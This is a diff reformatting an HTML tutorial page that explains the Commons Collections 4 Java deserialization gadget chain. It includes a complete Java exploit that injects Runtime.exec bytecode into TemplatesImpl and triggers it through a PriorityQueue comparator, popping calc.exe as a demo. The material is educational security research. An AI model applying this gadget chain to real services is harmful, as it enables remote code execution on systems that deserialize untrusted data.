@@ -162,37 +162,33 @@
 
 <p>So that being Said , below is how the payload looks like</p>
 <p>
-    <pre>
-<code>
-    Object templates = Gadgets.createTemplatesImpl(command); //1
+<div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">Object</span> templates = <span style="color: #cf8e6d;">Gadgets</span>.<span style="color: #56a8f5;">createTemplatesImpl</span>(command); <span style="color: #808080;">//1</span>
 
-    ConstantTransformer constant = new ConstantTransformer(String.class); //2
+<span style="color: #cf8e6d;">ConstantTransformer</span> constant = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">ConstantTransformer</span>(<span style="color: #cf8e6d;">String</span>.<span style="color: #cf8e6d;">class</span>); <span style="color: #808080;">//2</span>
 
-    // 3
-    Class[] paramTypes = new Class[] { String.class };
-    Object[] args = new Object[] { "foo" };
-    InstantiateTransformer instantiate = new InstantiateTransformer(
-            paramTypes, args);
+<span style="color: #808080;">// 3</span>
+<span style="color: #cf8e6d;">Class</span>[] paramTypes = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Class</span>[] { <span style="color: #cf8e6d;">String</span>.<span style="color: #cf8e6d;">class</span> };
+<span style="color: #cf8e6d;">Object</span>[] args = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Object</span>[] { <span style="color: #6aab73;">"foo"</span> };
+<span style="color: #cf8e6d;">InstantiateTransformer</span> instantiate = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">InstantiateTransformer</span>(
+        paramTypes, args);
 
-    // 4
-    paramTypes = (Class[]) Reflections.getFieldValue(instantiate, "iParamTypes");
-    args = (Object[]) Reflections.getFieldValue(instantiate, "iArgs");
+<span style="color: #808080;">// 4</span>
+paramTypes = (<span style="color: #cf8e6d;">Class</span>[]) <span style="color: #cf8e6d;">Reflections</span>.<span style="color: #56a8f5;">getFieldValue</span>(instantiate, <span style="color: #6aab73;">"iParamTypes"</span>);
+args = (<span style="color: #cf8e6d;">Object</span>[]) <span style="color: #cf8e6d;">Reflections</span>.<span style="color: #56a8f5;">getFieldValue</span>(instantiate, <span style="color: #6aab73;">"iArgs"</span>);
 
-    ChainedTransformer chain = new ChainedTransformer(new Transformer[] { constant, instantiate });
+<span style="color: #cf8e6d;">ChainedTransformer</span> chain = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">ChainedTransformer</span>(<span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Transformer</span>[] { constant, instantiate });
 
-    // 5
-    PriorityQueue&#60;Object&#62; queue = new PriorityQueue&#60;Object&#62;(2, new TransformingComparator(chain));
-    queue.add(1);
-    queue.add(1);
+<span style="color: #808080;">// 5</span>
+<span style="color: #cf8e6d;">PriorityQueue</span>&lt;<span style="color: #cf8e6d;">Object</span>&gt; queue = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">PriorityQueue</span>&lt;<span style="color: #cf8e6d;">Object</span>&gt;(<span style="color: #b3ae60;">2</span>, <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">TransformingComparator</span>(chain));
+queue.<span style="color: #56a8f5;">add</span>(<span style="color: #b3ae60;">1</span>);
+queue.<span style="color: #56a8f5;">add</span>(<span style="color: #b3ae60;">1</span>);
 
-    // 6
-    Reflections.setFieldValue(constant, "iConstant", TrAXFilter.class);
-    paramTypes[0] = Templates.class;
-    args[0] = templates;
+<span style="color: #808080;">// 6</span>
+<span style="color: #cf8e6d;">Reflections</span>.<span style="color: #56a8f5;">setFieldValue</span>(constant, <span style="color: #6aab73;">"iConstant"</span>, <span style="color: #cf8e6d;">TrAXFilter</span>.<span style="color: #cf8e6d;">class</span>);
+paramTypes[<span style="color: #b3ae60;">0</span>] = <span style="color: #cf8e6d;">Templates</span>.<span style="color: #cf8e6d;">class</span>;
+args[<span style="color: #b3ae60;">0</span>] = templates;
 
-    return queue;
-</code>
-    </pre>
+<span style="color: #cf8e6d;">return</span> queue;</pre></div>
 </p>
 <p>
 Instead of InvokerTransformer, InstantiateTransformer is being used,
@@ -224,30 +220,26 @@ And at [6] we are changing the String.class of ConstantTransformer to TraXFilter
 <p>
 Now if we put all the above together.
 <br>
-<pre>
-- Instantiate the ConstantTransformer with TraXfilter.class
+<pre><code>- Instantiate the ConstantTransformer with TraXfilter.class
 - Instantiate  the InstantiateTransformer with Templates.class and the value as templates(That we obtained from step 1)
 - Create the chained TransFormer with Constant and Instantiate Transformer
 - Instantiate the Priority Queue with the TrnasformingComparator with ChainedTransFormer as the transformer
 - Add any random value into priority Queue
-</pre>
+</code></pre>
 <br>
 So the whole above code can look like below
 </p>
 <p>
-    <pre>
-<code>
-Object templates = Gadgets.createTemplatesImpl(command);
+<pre><code>Object templates = Gadgets.createTemplatesImpl(command);
 ConstantTransformer constant = new ConstantTransformer(TrAXFilter.class);
 Class[] paramTypes = new Class[] { Templates.class };
 Object[] argst = new Object[] { templates };
 InstantiateTransformer instantiate = new InstantiateTransformer(paramTypes, argst);
 ChainedTransformer chain = new ChainedTransformer(new Transformer[] { constant, instantiate });
-PriorityQueue&#60;Object&#62; queue = new PriorityQueue&#60;Object&#62;(2, new TransformingComparator(chain));
+PriorityQueue<Object> queue = new PriorityQueue<Object>(2, new TransformingComparator(chain));
 queue.add(1);
 queue.add(1);
-</code>
-    </pre>
+</code></pre>
 </p>
 <p>Question:<br>
     How are we adding  1 into priority Queue but still achieving Code Execution?</p>
@@ -262,29 +254,24 @@ Here the obj1 and obj2 are the values we pass via queue.add()
 Now in the transformer.apply() , here the transformer is ChainedTransFormer, and if you see the chainedTrasformer's transform Code
     </p>
     <p>
-        <pre>
-<code>
-    @Override
-    public T transform(T object) {
-        for (final Transformer<? super T, ? extends T> iTransformer : iTransformers) {
-            object = iTransformer.apply(object);
-        }
-        return object;
+<pre><code>@Override
+public T transform(T object) {
+    for (final Transformer<? super T, ? extends T> iTransformer : iTransformers) {
+        object = iTransformer.apply(object);
     }
-</code>
-        </pre>
+    return object;
+}
+</code></pre>
     </p>
 <p>
     So it iterates over the list , inout case its ConstantTransformer and InstantiateTransformer and calls the transForm() on them.
-<pre>
-- once we Instantiate ConstantTransformer () no matter what we pass to the transform() it will alwasy return the instantied Value and in our case it will be TraXFilter.class
+<pre><code>- once we Instantiate ConstantTransformer () no matter what we pass to the transform() it will alwasy return the instantied Value and in our case it will be TraXFilter.class
 - For the InstantiateTransformer , the Object Passed from the queue.add has alredybeen overwritten from the output of ConstantTransformer due to the Below code
-</pre>
+</code></pre>
 </p>
 <p>
-    <pre>
-        object = iTransformer.apply(object);
-    </pre>
+<pre><code>object = iTransformer.apply(object);
+</code></pre>
 </p>
 <p>
     And hence even if we are passing 1 from queue.add() for InstantiateTransformer () it sees the TraXfilter.class<br>
@@ -293,10 +280,8 @@ That is why it doesn't matter if we pass 1 or 2 or any other string.(Keep in min
 <p>
     So we can modify the code and the code along with TemplatesImpl creation for CommonsCollection4 gadget will look like below.
 </p>
-<p>
-    <pre>
-<code>
-import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+
+<pre><code>import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import java.lang.reflect.Field;
 import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
 import javassist.ClassClassPath;
@@ -311,7 +296,7 @@ import org.apache.commons.collections4.Transformer;
 import org.apache.commons.collections4.comparators.TransformingComparator;
 public class cc4 {
     public static void main(String[] args) throws Exception {
-        String command="calc.exe";
+        String command = "calc.exe";
         ClassPool pool = ClassPool.getDefault();
 
         /*
@@ -324,7 +309,6 @@ public class cc4 {
             AbstractTranslet.class or else TemplatesIMPL will not execute it(Figure out why)
          */
 
-
         final CtClass clazz = pool.get(cc4.class.getName()); 
         String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
             command.replace("\\", "\\\\").replace("\"", "\\\"") +
@@ -334,23 +318,18 @@ public class cc4 {
         clazz.setSuperclass(superC);
         final byte[] classBytes = clazz.toBytecode();
 
-
-
-        byte[] maliciousBytecode =classBytes;
+        byte[] maliciousBytecode = classBytes;
     
-
         /*
          * Till Line 58 we are creating an Object of TemplatesIMPL class and using reflection to set the _bytecode,_name and
          * _tfactory , as these are necessary fields.
          * Why can't we use the normal getters and setters(FigureOut)
          */
         TemplatesImpl templates = new TemplatesImpl();
-
     
         Field bytecodesField = TemplatesImpl.class.getDeclaredField("_bytecodes");
         bytecodesField.setAccessible(true);
         bytecodesField.set(templates, new byte[][]{maliciousBytecode});
-
        
         Field nameField = TemplatesImpl.class.getDeclaredField("_name");
         nameField.setAccessible(true);
@@ -361,23 +340,18 @@ public class cc4 {
         tfacname.set(templates, TransformerFactoryImpl.class.newInstance());
 
         //templates.newTransformer();
-
          
         ConstantTransformer constant = new ConstantTransformer(TrAXFilter.class);
-		Class[] paramTypes = new Class[] { Templates.class };
-		Object[] argst = new Object[] { templates };
-		InstantiateTransformer instantiate = new InstantiateTransformer(paramTypes, argst);
+        Class[] paramTypes = new Class[] { Templates.class };
+        Object[] argst = new Object[] { templates };
+        InstantiateTransformer instantiate = new InstantiateTransformer(paramTypes, argst);
         ChainedTransformer chain = new ChainedTransformer(new Transformer[] { constant, instantiate });
-        PriorityQueue&#60;Object&#62; queue = new PriorityQueue&#60;Object&#62;(2, new TransformingComparator(chain));
-		queue.add(1);
-		queue.add(1);
-        
+        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, new TransformingComparator(chain));
+        queue.add(1);
+        queue.add(1);
     }
 }
-</code>
-    </pre>
-</p>
-
+</code></pre>
 <p>
     <img src="images/cc/cc4popup.PNG">
 </p>
